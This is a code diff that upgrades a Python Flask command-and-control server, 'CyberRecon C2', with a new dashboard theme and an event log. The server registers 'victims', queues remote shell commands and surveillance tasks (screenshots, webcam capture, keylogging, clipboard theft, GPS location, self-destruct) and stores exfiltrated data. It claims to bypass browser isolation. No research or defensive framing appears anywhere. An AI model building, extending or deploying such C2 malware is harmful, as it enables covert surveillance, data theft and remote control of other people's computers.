@@ -1,21 +1,17 @@
-﻿"""
-CyberRecon C2 Server — v3.5.1 (HARDENED + AUTH + WIPE + DEADLOCK FIX)
-Implements Mandiant QR C2 Bypass for Browser Isolation.
+"""
+CyberRecon C2 Server — v3.6.0 (NOVA GUI)
 
-v3.5.1 fix:
-  - /self_destruct_notify no longer calls save_victims() while holding
-    victims_lock — this was causing a self-deadlock that hung the server
-    after the first self-destruct, blocking all other victims.
+v3.6.0 changes:
+  - Replaced dashboard HTML with the "Nova" template (light/dark themes).
+  - All metrics, victim table, console, and chart are wired to live data.
+  - Command panel + victim selector moved into the sidebar.
+  - Exfil panels (screenshots / webcam / GPS / outputs) preserved.
+  - Backend routes unchanged: /victims, /command, /exfil-data, /latest_*.
 
-v3.5 features:
-  - Dashboard login (session cookie, HttpOnly, Secure, SameSite=Lax)
-  - Read-only APIs gated behind login
-  - Command-issuing APIs require login AND operator token
-  - AES-256-GCM QR payload encryption
-  - Victim shared-key auth (X-Victim-Key header or ?vkey= query)
-  - Rate limiting on /register + victim cap
-  - /self_destruct_notify — purge victim record on self-destruct
-  - Optional self-signed TLS
+v3.5.2 baseline:
+  - Dashboard login, operator token, victim key auth.
+  - AES-256-GCM QR encryption, rate limiting, victim cap.
+  - /self_destruct_notify with wipe metrics (self-deadlock fixed).
 """
 
 import base64
@@ -159,9 +155,26 @@ def _register_allowed(ip):
         return True
 
 
+# ======== EVENT LOG (for the console panel) ========
+_event_log = []
+_event_log_lock = threading.Lock()
+EVENT_LOG_MAX = 200
+
+
+def log_event(level, msg):
+    with _event_log_lock:
+        _event_log.append({
+            "ts": time.time(),
+            "level": level,  # "ok" | "warn" | "err" | "info"
+            "msg": msg,
+        })
+        if len(_event_log) > EVENT_LOG_MAX:
+            del _event_log[:len(_event_log) - EVENT_LOG_MAX]
+
+
 # ======== STORAGE ========
 victims = {}
-victims_lock = threading.RLock()   # RLock → reentrant, belt-and-braces
+victims_lock = threading.RLock()
 VICTIMS_FILE = "victims_state.json"
 
 
@@ -176,12 +189,9 @@ def _trim(v):
 
 
 def save_victims():
-    """Save state to disk. Caller MUST NOT hold victims_lock if it's a plain Lock.
-    With RLock, nesting is safe but still prefer calling outside for clarity."""
     try:
         for v in victims.values():
             _trim(v)
-        # Atomic write: temp file + rename
         tmp = VICTIMS_FILE + ".tmp"
         with open(tmp, "w") as f:
             json.dump(victims, f)
@@ -381,6 +391,7 @@ def index():
 @require_victim_key
 def register_victim():
     if not _register_allowed(request.remote_addr or "unknown"):
+        log_event("warn", f"Rate limited register from {request.remote_addr}")
         return jsonify({"error": "Rate limited"}), 429
 
     data = request.get_json() or {}
@@ -392,6 +403,7 @@ def register_victim():
             if offline:
                 del victims[offline[0]]
             else:
+                log_event("err", f"Victim cap reached ({VICTIM_CAP})")
                 return jsonify({"error": "Victim cap reached"}), 503
 
         victims[victim_id] = {
@@ -413,7 +425,8 @@ def register_victim():
             "status": "online"
         }
 
-    save_victims()   # OUTSIDE the lock
+    save_victims()
+    log_event("ok", f"New victim registered: {data.get('hostname', 'unknown')} ({victim_id[:8]}…)")
     print(f"[+] New victim registered: {victim_id} from {request.remote_addr}")
     return jsonify({"victim_id": victim_id, "status": "registered"})
 
@@ -427,7 +440,6 @@ def get_qr_command(victim_id):
         victim = victims[victim_id]
         victim["last_seen"] = time.time()
         victim["status"] = "online"
-        # v3.5.1 — refresh IP on every contact so dashboard shows current
         victim["ip"] = request.remote_addr
         cmd = victim["command_queue"][0] if victim["command_queue"] else None
 
@@ -468,6 +480,7 @@ def queue_command(victim_id):
         q.append(cmd)
 
     save_victims()
+    log_event("info", f"Command queued for {victim_id[:8]}…: {cmd_name}")
     print(f"[+] Command queued for {victim_id}: {cmd_name}")
     return jsonify({"status": "queued", "command": cmd})
 
@@ -507,6 +520,7 @@ def queue_shell_command(victim_id):
         victims[victim_id]["command_queue"].append(cmd)
 
     save_victims()
+    log_event("info", f"Shell queued for {victim_id[:8]}…: {raw}")
     print(f"[+] Shell queued for {victim_id}: {raw}")
     return jsonify({"status": "queued", "command": cmd})
 
@@ -552,34 +566,51 @@ def receive_exfil(victim_id):
         if data_type in OUTPUT_TYPES:
             victims[victim_id]["outputs"].append(entry)
     save_victims()
+    log_event("ok", f"Exfil: {data_type} from {victim_id[:8]}… ({entry['size']} B)")
     print(f"[EXFIL] {data_type} from {victim_id} ({entry['size']} bytes)")
     return jsonify({"status": "received"})
 
 
+# ======== SELF-DESTRUCT NOTIFY ========
+
 @app.route("/self_destruct_notify/<victim_id>", methods=["POST"])
 @require_victim_key
 def self_destruct_notify(victim_id):
-    """Victim about to exit — purge its data from server memory + disk.
+    purged_metrics = None
 
-    v3.5.1 FIX: previously this called save_victims() while holding
-    victims_lock, causing a self-deadlock (threading.Lock is not
-    reentrant). That froze the whole server after the first self-destruct
-    and blocked all other victims. Now save_victims() is called OUTSIDE
-    the lock.
-    """
-    purged = 0
     with victims_lock:
         if victim_id in victims:
             v = victims[victim_id]
-            purged = len(v["exfil_buffer"])
-            print(f"[WIPE] Self-destruct from {victim_id} "
-                  f"({purged} exfil entries purged)")
+            purged_metrics = {
+                "id": victim_id,
+                "hostname": v.get("hostname", "unknown"),
+                "ip": v.get("ip", "unknown"),
+                "user": v.get("user", "unknown"),
+                "registered_at": v.get("registered_at", ""),
+                "exfil_buffer_count": len(v["exfil_buffer"]),
+                "screenshots_count": len(v["screenshots"]),
+                "webcam_snaps_count": len(v["webcam_snaps"]),
+                "keystrokes_count": len(v["keystrokes"]),
+                "locations_count": len(v["locations"]),
+                "files_count": len(v["files"]),
+                "outputs_count": len(v["outputs"]),
+            }
             del victims[victim_id]
 
-    if purged:
-        save_victims()   # OUTSIDE the lock — no more self-deadlock
+    if purged_metrics:
+        print("=" * 60)
+        print(f"[WIPE] Self-destruct received from {purged_metrics['id']}")
+        print(f"       Hostname:        {purged_metrics['hostname']}")
+        print(f"       IP:              {purged_metrics['ip']}")
+        print(f"       Exfil entries:   {purged_metrics['exfil_buffer_count']}")
+        print(f"       Server now tracking {len(victims)} victims.")
+        print("=" * 60)
+        log_event("warn", f"Self-destruct: {purged_metrics['hostname']} purged")
+        save_victims()
+        return jsonify({"status": "wiped", "purged": purged_metrics})
 
-    return jsonify({"status": "wiped"})
+    log_event("info", f"Self-destruct from unknown victim {victim_id[:8]}…")
+    return jsonify({"status": "already_gone", "victim_id": victim_id})
 
 
 @app.route("/victims")
@@ -646,6 +677,13 @@ def get_exfil_data(victim_id):
             "locations": v["locations"][-3:],
             "outputs": v["outputs"][-10:]
         })
+
+
+@app.route("/events")
+@require_dashboard_login
+def get_events():
+    with _event_log_lock:
+        return jsonify({"events": list(_event_log)})
 
 
 @app.route("/poll/<victim_id>")
@@ -785,756 +823,849 @@ def get_latest_webcam(victim_id):
     return _serve_b64_image(img_data, "image/jpeg")
 
 
-# ======== DASHBOARD ========
+# ======== DASHBOARD (NOVA GUI) ========
 
 DASHBOARD_HTML = r"""
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberRecon • Command Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg-primary: #06080f; --bg-secondary: #0d1220; --bg-tertiary: #131a2e; --bg-card: #0f1524;
-            --border: #1a2440; --border-hover: #2a3a60;
-            --text-primary: #e8edf7; --text-secondary: #7a8ba8; --text-muted: #4a5a78;
-            --accent: #00d4ff; --accent-glow: rgba(0, 212, 255, 0.4);
-            --success: #00ff88; --success-glow: rgba(0, 255, 136, 0.3);
-            --warning: #ffb340; --danger: #ff3b5c;
-            --gradient-1: linear-gradient(135deg, #00d4ff 0%, #0066ff 100%);
-            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.5);
-            --shadow-glow: 0 0 20px var(--accent-glow);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--bg-primary); color: var(--text-primary);
-            min-height: 100vh; overflow-x: hidden;
-            background-image:
-                radial-gradient(circle at 20% 20%, rgba(0, 212, 255, 0.06) 0%, transparent 50%),
-                radial-gradient(circle at 80% 80%, rgba(0, 255, 136, 0.04) 0%, transparent 50%);
-            background-attachment: fixed;
-        }
-        body::before {
-            content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background-image:
-                linear-gradient(rgba(0, 212, 255, 0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 212, 255, 0.02) 1px, transparent 1px);
-            background-size: 50px 50px; pointer-events: none; z-index: 0;
-        }
-        .header {
-            position: sticky; top: 0; z-index: 100;
-            background: rgba(13, 18, 32, 0.85);
-            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border); padding: 14px 32px;
-            display: flex; align-items: center; justify-content: space-between;
-        }
-        .logo { display: flex; align-items: center; gap: 12px; }
-        .logo-icon {
-            width: 36px; height: 36px; background: var(--gradient-1); border-radius: 10px;
-            display: flex; align-items: center; justify-content: center; font-size: 20px;
-            box-shadow: var(--shadow-glow);
-        }
-        .logo-text {
-            font-size: 18px; font-weight: 700; letter-spacing: -0.5px;
-            background: var(--gradient-1); -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent; background-clip: text;
-        }
-        .logo-subtitle { font-size: 11px; color: var(--text-muted); letter-spacing: 0.5px; }
-        .header-right { display: flex; align-items: center; gap: 16px; }
-        .status-badge {
-            display: flex; align-items: center; gap: 8px; padding: 6px 14px;
-            background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3);
-            border-radius: 20px; font-size: 11px; font-weight: 600; color: var(--success);
-        }
-        .status-dot { width: 6px; height: 6px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); }
-        .clock { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-secondary);
-                 padding: 6px 12px; background: var(--bg-tertiary); border-radius: 8px; border: 1px solid var(--border); }
-        .container { position: relative; z-index: 1; padding: 24px 32px; max-width: 1600px; margin: 0 auto; }
-        .metrics { display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; margin-bottom: 24px; }
-        .metric-card {
-            background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
-            padding: 20px; position: relative; overflow: hidden;
-            transition: border-color 0.2s, transform 0.2s;
-        }
-        .metric-card:hover { border-color: var(--border-hover); transform: translateY(-2px); }
-        .metric-value {
-            font-size: 32px; font-weight: 800; color: var(--success);
-            letter-spacing: -1px; line-height: 1; font-variant-numeric: tabular-nums;
-        }
-        .metric-label {
-            font-size: 11px; color: var(--text-muted); margin-top: 8px;
-            text-transform: uppercase; letter-spacing: 1px; font-weight: 600;
-        }
-        .grid { display: grid; grid-template-columns: 340px 1fr; gap: 20px; align-items: start; }
-        .sidebar {
-            background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
-            padding: 20px; display: flex; flex-direction: column;
-            position: sticky; top: 84px; max-height: calc(100vh - 108px);
-            overflow-y: auto; overflow-x: hidden;
-        }
-        .sidebar::-webkit-scrollbar { width: 8px; }
-        .sidebar::-webkit-scrollbar-track { background: var(--bg-secondary); border-radius: 4px; }
-        .sidebar::-webkit-scrollbar-thumb { background: var(--border-hover); border-radius: 4px; }
-        .sidebar h3 {
-            color: var(--accent); font-size: 12px; text-transform: uppercase;
-            letter-spacing: 1.5px; margin-bottom: 16px; font-weight: 600;
-        }
-        .command-bar { display: flex; gap: 8px; margin-bottom: 16px; }
-        .command-bar > button {
-            padding: 10px 20px; background: var(--gradient-1); border: none; border-radius: 8px;
-            color: #06080f; font-family: inherit; font-weight: 700; font-size: 13px; cursor: pointer;
-        }
-        .dropdown { position: relative; flex: 1; }
-        .dropdown-toggle {
-            width: 100%; padding: 10px 12px; background: var(--bg-tertiary);
-            border: 1px solid var(--border); border-radius: 8px;
-            color: var(--text-primary); font-family: inherit; font-size: 13px;
-            cursor: pointer; text-align: left;
-            display: flex; align-items: center; justify-content: space-between; gap: 8px;
-        }
-        .dropdown-arrow { color: var(--text-muted); font-size: 11px; }
-        .dropdown-menu {
-            position: absolute; top: calc(100% + 4px); left: 0; right: 0;
-            background: var(--bg-tertiary); border: 1px solid var(--border-hover);
-            border-radius: 10px; padding: 6px; max-height: 320px; overflow-y: auto;
-            z-index: 500; display: none; box-shadow: var(--shadow-lg);
-        }
-        .dropdown-menu.open { display: block; }
-        .dropdown-menu::-webkit-scrollbar { width: 8px; }
-        .dropdown-menu::-webkit-scrollbar-thumb { background: var(--border-hover); border-radius: 4px; }
-        .dropdown-item {
-            padding: 9px 12px; font-size: 13px; color: var(--text-primary);
-            border-radius: 6px; cursor: pointer; white-space: nowrap;
-        }
-        .dropdown-item:hover { background: var(--bg-card); color: var(--accent); }
-        .dropdown-item.active { background: rgba(0, 212, 255, 0.12); color: var(--accent); }
-        .download-btn {
-            width: 100%; padding: 12px 20px; margin-top: 10px;
-            background: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
-            border: none; border-radius: 8px; color: #06080f; font-family: inherit;
-            font-weight: 700; font-size: 13px; cursor: pointer;
-        }
-        .download-btn:disabled { opacity: 0.4; cursor: not-allowed; background: var(--bg-tertiary); color: var(--text-muted); }
-        .victim-list { flex: 1; overflow-y: auto; max-height: 500px; display: flex; flex-direction: column; gap: 8px; }
-        .victim-card {
-            background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: 10px;
-            padding: 14px; cursor: pointer; transition: border-color 0.2s, transform 0.2s;
-        }
-        .victim-card:hover { border-color: var(--border-hover); transform: translateX(4px); background: var(--bg-card); }
-        .victim-card.active { border-color: var(--success); background: rgba(0, 255, 136, 0.06); }
-        .victim-card h4 { font-size: 13px; font-weight: 600; margin-bottom: 6px; }
-        .victim-card p { color: var(--text-secondary); font-size: 11px; margin-top: 3px; font-family: 'JetBrains Mono', monospace; }
-        .status-online { color: var(--success); font-weight: 600; }
-        .status-offline { color: var(--danger); font-weight: 600; }
-        .main-panel { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
-        .panel {
-            background: var(--bg-card); border: 1px solid var(--border); border-radius: 14px;
-            padding: 20px; display: flex; flex-direction: column;
-        }
-        .panel h3 { color: var(--accent); font-size: 12px; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 14px; font-weight: 600; }
-        .panel-content {
-            background: var(--bg-secondary); border-radius: 10px; flex: 1; min-height: 220px;
-            overflow: hidden; position: relative;
-        }
-        .panel-content img { width: 100%; height: auto; display: block; border-radius: 8px; }
-        .panel-content pre {
-            padding: 14px; font-family: 'JetBrains Mono', monospace; font-size: 11px;
-            color: var(--text-secondary); white-space: pre-wrap; word-break: break-all;
-            max-height: 300px; overflow-y: auto; line-height: 1.6;
-        }
-        .empty-state {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 220px; color: var(--text-muted); font-size: 12px; gap: 8px;
-        }
-        .empty-state-icon { font-size: 32px; opacity: 0.3; }
-        .gps-info { padding: 14px; }
-        .gps-coords { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 700; color: var(--success); margin-bottom: 8px; }
-        .gps-meta { color: var(--text-secondary); font-size: 12px; margin-bottom: 14px; }
-        .log-panel { grid-column: 1 / -1; }
-        .log-panel .panel-content { max-height: 200px; overflow-y: auto; }
-        .log-entry {
-            padding: 8px 14px; font-family: 'JetBrains Mono', monospace; font-size: 11px;
-            border-bottom: 1px solid var(--border); display: flex; gap: 10px;
-        }
-        .log-entry .log-time { color: var(--text-muted); flex-shrink: 0; }
-        .log-entry.info { color: var(--accent); }
-        .log-entry.success { color: var(--success); }
-        .log-entry.error { color: var(--danger); }
-        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberRecon • Command Center</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --violet:#7c3aed; --pink:#ec4899; --cyan:#06b6d4;
+    --amber:#f59e0b; --emerald:#10b981; --rose:#f43f5e;
+    --bg:#f7f8fc; --card:#ffffff; --sidebar:#ffffff;
+    --text:#0f172a; --muted:#64748b; --border:#e8ecf4;
+    --shadow:0 4px 20px rgba(15,23,42,.06);
+    --shadow-lg:0 12px 40px rgba(15,23,42,.10);
+    --grad:linear-gradient(120deg,#7c3aed,#ec4899 45%,#06b6d4);
+  }
+  html[data-theme="dark"] {
+    --bg:#0b1020; --card:#151b30; --sidebar:#111729;
+    --text:#eef2ff; --muted:#93a0bd; --border:#242c46;
+    --shadow:0 4px 20px rgba(0,0,0,.35);
+    --shadow-lg:0 12px 40px rgba(0,0,0,.5);
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    font-family:'Inter',system-ui,sans-serif;
+    background:var(--bg); color:var(--text);
+    min-height:100vh; transition:background .3s,color .3s;
+    background-image:
+      radial-gradient(circle at 8% 0%, rgba(124,58,237,.10), transparent 42%),
+      radial-gradient(circle at 95% 10%, rgba(6,182,212,.10), transparent 42%);
+  }
+
+  /* ── Top bar ───────────────────────────── */
+  .topbar{
+    position:sticky; top:0; z-index:50;
+    display:flex; align-items:center; gap:20px;
+    padding:14px 28px;
+    background:color-mix(in srgb, var(--card) 82%, transparent);
+    backdrop-filter:blur(14px);
+    border-bottom:1px solid var(--border);
+  }
+  .brand{display:flex;align-items:center;gap:11px}
+  .brand-mark{
+    width:38px;height:38px;border-radius:12px;
+    background:var(--grad); display:grid;place-items:center;
+    font-size:19px; box-shadow:0 6px 18px rgba(124,58,237,.35); color:#fff;
+  }
+  .brand-name{font-size:17px;font-weight:800;letter-spacing:-.3px}
+  .brand-sub{font-size:10.5px;color:var(--muted);letter-spacing:.6px;text-transform:uppercase}
+
+  .search{
+    flex:1; max-width:420px; margin-left:12px;
+    display:flex;align-items:center;gap:9px;
+    padding:9px 14px; border-radius:11px;
+    background:var(--bg); border:1px solid var(--border);
+  }
+  .search input{
+    border:0;background:transparent;outline:0;width:100%;
+    font-family:inherit;font-size:13px;color:var(--text);
+  }
+  .search input::placeholder{color:var(--muted)}
+
+  .top-actions{margin-left:auto;display:flex;align-items:center;gap:10px}
+  .icon-btn{
+    width:38px;height:38px;border-radius:11px;border:1px solid var(--border);
+    background:var(--card); color:var(--text); cursor:pointer;
+    display:grid;place-items:center; font-size:16px;
+    transition:transform .15s, border-color .15s, box-shadow .15s;
+  }
+  .icon-btn:hover{transform:translateY(-2px);border-color:var(--violet);box-shadow:var(--shadow)}
+  .avatar{
+    width:38px;height:38px;border-radius:50%;
+    background:linear-gradient(135deg,#f59e0b,#f43f5e);
+    display:grid;place-items:center;color:#fff;font-weight:700;font-size:14px;
+    cursor:pointer;
+  }
+
+  /* ── Layout ────────────────────────────── */
+  .shell{display:grid;grid-template-columns:236px 1fr;gap:24px;padding:24px 28px;max-width:1560px;margin:0 auto}
+
+  /* ── Sidebar ───────────────────────────── */
+  .sidebar{
+    background:var(--sidebar);border:1px solid var(--border);border-radius:18px;
+    padding:16px; height:fit-content; position:sticky; top:90px;
+    box-shadow:var(--shadow);
+  }
+  .nav-label{font-size:10.5px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted);padding:8px 10px 6px}
+  .nav-item{
+    display:flex;align-items:center;gap:11px;
+    padding:10px 12px;border-radius:11px;
+    font-size:13.5px;font-weight:500;color:var(--muted);
+    cursor:pointer;margin-bottom:2px;
+    transition:background .15s,color .15s,transform .15s;
+  }
+  .nav-item:hover{background:color-mix(in srgb, var(--violet) 8%, transparent);color:var(--text);transform:translateX(3px)}
+  .nav-item.active{
+    background:linear-gradient(135deg, rgba(124,58,237,.14), rgba(6,182,212,.10));
+    color:var(--violet); font-weight:650;
+    box-shadow:inset 0 0 0 1px rgba(124,58,237,.22);
+  }
+  .nav-item .dot{width:7px;height:7px;border-radius:50%;background:currentColor;opacity:.55}
+  .nav-item .badge{
+    margin-left:auto;font-size:10.5px;font-weight:700;
+    background:var(--rose);color:#fff;padding:2px 7px;border-radius:20px;
+  }
+
+  /* Victim selector */
+  .victim-select{
+    width:100%; padding:9px 11px; border-radius:10px;
+    border:1px solid var(--border); background:var(--bg);
+    color:var(--text); font-family:inherit; font-size:12.5px;
+    margin-bottom:10px;
+  }
+  .command-row{display:flex;gap:8px;margin-bottom:10px}
+  .command-row select{
+    flex:1; padding:9px 11px; border-radius:10px;
+    border:1px solid var(--border); background:var(--bg);
+    color:var(--text); font-family:inherit; font-size:12.5px;
+  }
+  .btn-primary{
+    padding:9px 16px; border-radius:10px; border:0;
+    background:var(--grad); color:#fff; font-weight:700;
+    font-family:inherit; font-size:12.5px; cursor:pointer;
+    transition:transform .15s, box-shadow .15s;
+  }
+  .btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(124,58,237,.35)}
+  .btn-danger{
+    width:100%; padding:9px 16px; border-radius:10px; border:0;
+    background:linear-gradient(135deg,#f43f5e,#ec4899); color:#fff;
+    font-weight:700; font-family:inherit; font-size:12.5px; cursor:pointer;
+    margin-top:6px;
+  }
+  .btn-download{
+    width:100%; padding:9px 16px; border-radius:10px; border:0;
+    background:linear-gradient(135deg,#10b981,#06b6d4); color:#fff;
+    font-weight:700; font-family:inherit; font-size:12.5px; cursor:pointer;
+    margin-top:6px;
+  }
+
+  /* ── Metrics ───────────────────────────── */
+  .metrics{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:16px;margin-bottom:22px}
+  .metric{
+    background:var(--card);border:1px solid var(--border);border-radius:16px;
+    padding:18px 18px 20px; position:relative; overflow:hidden;
+    box-shadow:var(--shadow);
+    transition:transform .18s, box-shadow .18s;
+  }
+  .metric:hover{transform:translateY(-3px);box-shadow:var(--shadow-lg)}
+  .metric::after{
+    content:"";position:absolute;left:0;right:0;bottom:0;height:4px;
+    background:var(--accent,var(--violet));
+  }
+  .metric-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+  .metric-icon{
+    width:38px;height:38px;border-radius:11px;display:grid;place-items:center;
+    font-size:18px;background:color-mix(in srgb, var(--accent) 14%, transparent);
+  }
+  .metric-value{font-size:29px;font-weight:800;letter-spacing:-1px;line-height:1;font-variant-numeric:tabular-nums}
+  .metric-label{font-size:11.5px;color:var(--muted);margin-top:7px;font-weight:600;letter-spacing:.3px}
+
+  /* ── Panels ────────────────────────────── */
+  .grid{display:grid;grid-template-columns:2fr 1fr;gap:18px}
+  .panel{
+    background:var(--card);border:1px solid var(--border);border-radius:16px;
+    padding:20px; box-shadow:var(--shadow);
+  }
+  .panel-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+  .panel-title{font-size:14px;font-weight:700}
+  .panel-title span{color:var(--muted);font-weight:500;font-size:12px;margin-left:8px}
+  .chip{
+    font-size:11px;font-weight:650;padding:4px 11px;border-radius:20px;
+    background:color-mix(in srgb, var(--cyan) 14%, transparent);color:#0891b2;
+  }
+
+  /* chart */
+  .chart{height:210px;display:flex;align-items:flex-end;gap:9px;padding-top:10px}
+  .bar{
+    flex:1;border-radius:8px 8px 4px 4px;min-height:8px;
+    background:var(--grad); opacity:.85;
+    transition:opacity .2s, transform .2s;
+  }
+  .bar:hover{opacity:1;transform:scaleY(1.03)}
+
+  /* feed */
+  .feed{display:flex;flex-direction:column;gap:14px;max-height:260px;overflow-y:auto}
+  .feed-item{display:flex;gap:12px;align-items:flex-start}
+  .feed-dot{
+    width:9px;height:9px;border-radius:50%;margin-top:5px;flex-shrink:0;
+    box-shadow:0 0 0 3px color-mix(in srgb, currentColor 18%, transparent);
+  }
+  .feed-body{flex:1;min-width:0}
+  .feed-text{font-size:12.8px;line-height:1.45}
+  .feed-time{font-size:11px;color:var(--muted);margin-top:3px;font-family:'JetBrains Mono',monospace}
+
+  /* table */
+  .table{width:100%;border-collapse:collapse;font-size:13px}
+  .table th{
+    text-align:left;font-size:10.5px;letter-spacing:.9px;text-transform:uppercase;
+    color:var(--muted);font-weight:700;padding:0 12px 12px;
+  }
+  .table td{padding:13px 12px;border-top:1px solid var(--border)}
+  .table tbody tr{transition:background .15s;cursor:pointer}
+  .table tbody tr:hover{background:color-mix(in srgb, var(--violet) 5%, transparent)}
+  .pill{font-size:11px;font-weight:650;padding:4px 11px;border-radius:20px;display:inline-block}
+  .pill.ok{background:rgba(16,185,129,.14);color:#059669}
+  .pill.warn{background:rgba(245,158,11,.16);color:#b45309}
+  .pill.info{background:rgba(6,182,212,.14);color:#0891b2}
+  .pill.err{background:rgba(244,63,94,.14);color:#dc2626}
+  .mono{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--muted)}
+
+  /* console */
+  .console{
+    background:#0d1224;border-radius:12px;padding:16px;height:200px;overflow-y:auto;
+    font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.85;color:#a5b4d4;
+  }
+  .console .ok{color:#34d399}
+  .console .warn{color:#fbbf24}
+  .console .err{color:#fb7185}
+  .console .info{color:#67e8f9}
+  .console .time{color:#475569}
+
+  /* exfil panel */
+  .panel-img{
+    width:100%; border-radius:12px; display:block; background:#0d1224;
+    min-height:200px; object-fit:contain;
+  }
+  .panel-img-wrap{
+    background:#0d1224; border-radius:12px; min-height:200px;
+    display:flex; align-items:center; justify-content:center;
+    color:var(--muted); font-size:12px;
+  }
+  .panel-pre{
+    background:#0d1224; border-radius:12px; padding:14px;
+    font-family:'JetBrains Mono',monospace; font-size:11.5px;
+    color:#a5b4d4; white-space:pre-wrap; word-break:break-all;
+    max-height:240px; overflow-y:auto; margin:0;
+  }
+  .shell-input-bar{display:flex;gap:8px;margin-bottom:12px;align-items:center}
+  .shell-input-bar span{font-family:'JetBrains Mono',monospace;color:var(--emerald);font-size:14px}
+  .shell-input-bar input{
+    flex:1; padding:10px 12px; background:var(--bg);
+    border:1px solid var(--border); border-radius:10px;
+    color:var(--text); font-family:'JetBrains Mono',monospace;
+    font-size:12.5px; outline:none;
+  }
+
+  .full{grid-column:1/-1}
+
+  @media(max-width:1000px){
+    .shell{grid-template-columns:1fr}
+    .sidebar{position:static}
+    .grid{grid-template-columns:1fr}
+  }
+</style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">
-            <div class="logo-icon">⚡</div>
-            <div>
-                <div class="logo-text">CyberRecon</div>
-                <div class="logo-subtitle">MANDIANT QR C2 • BROWSER ISOLATION BYPASS</div>
-            </div>
-        </div>
-        <div class="header-right">
-            <div class="clock" id="clock">--:--:--</div>
-            <div class="status-badge"><span class="status-dot"></span> LIVE</div>
-            <a href="/logout" title="Sign out"
-               style="padding:6px 14px;background:rgba(255,59,92,0.1);
-                      border:1px solid rgba(255,59,92,0.3);border-radius:20px;
-                      font-size:11px;font-weight:600;color:#ff3b5c;
-                      text-decoration:none;cursor:pointer;">
-                ⏻ LOGOUT
-            </a>
-        </div>
+
+<header class="topbar">
+  <div class="brand">
+    <div class="brand-mark">⚡</div>
+    <div>
+      <div class="brand-name">CyberRecon</div>
+      <div class="brand-sub">Command Center</div>
     </div>
-    <div class="container">
-        <div class="metrics">
-            <div class="metric-card"><div class="metric-value" id="metric-victims">0</div><div class="metric-label">Active Victims</div></div>
-            <div class="metric-card"><div class="metric-value" id="metric-exfil">0</div><div class="metric-label">Exfil Events</div></div>
-            <div class="metric-card"><div class="metric-value" id="metric-screenshots">0</div><div class="metric-label">Screenshots</div></div>
-            <div class="metric-card"><div class="metric-value" id="metric-webcam">0</div><div class="metric-label">Webcam Captures</div></div>
-            <div class="metric-card"><div class="metric-value" id="metric-keystrokes">0</div><div class="metric-label">Keystroke Chunks</div></div>
-        </div>
-        <div class="grid">
-            <div class="sidebar">
-                <h3>🎯 TARGET VICTIMS</h3>
-                <div class="command-bar">
-                    <div class="dropdown" id="cmd-dropdown">
-                        <button type="button" class="dropdown-toggle" id="cmd-toggle">
-                            <span id="cmd-toggle-label">📸 Screenshot</span>
-                            <span class="dropdown-arrow">▾</span>
-                        </button>
-                        <div class="dropdown-menu" id="cmd-menu">
-                            <div class="dropdown-item" data-value="screenshot">📸 Screenshot</div>
-                            <div class="dropdown-item" data-value="webcam_snap">📷 Webcam</div>
-                            <div class="dropdown-item" data-value="keylog_start">⌨️ Keylog Start</div>
-                            <div class="dropdown-item" data-value="keylog_stop">⌨️ Keylog Stop</div>
-                            <div class="dropdown-item" data-value="clipboard_get">📋 Clipboard</div>
-                            <div class="dropdown-item" data-value="gps_locate">📍 GPS Locate</div>
-                            <div class="dropdown-item" data-value="process_list">⚙️ Process List</div>
-                            <div class="dropdown-item" data-value="system_info">💻 System Info</div>
-                            <div class="dropdown-item" data-value="whoami">👤 Whoami</div>
-                            <div class="dropdown-item" data-value="self_destruct">💀 Self Destruct</div>
-                        </div>
-                    </div>
-                    <button onclick="sendCommand()">SEND</button>
-                </div>
-                <button onclick="downloadAllData()" class="download-btn" id="download-btn" disabled>
-                    ⬇ DOWNLOAD ALL DATA
-                </button>
-                <div class="victim-list" id="victim-list">
-                    <div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
-                        <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>
-                        Waiting for victims...
-                    </div>
-                </div>
-            </div>
-            <div class="main-panel">
-                <div class="panel">
-                    <h3>📸 SCREENSHOTS</h3>
-                    <div class="panel-content" id="screenshots-panel">
-                        <div class="empty-state"><div class="empty-state-icon">📸</div>No screenshots yet</div>
-                    </div>
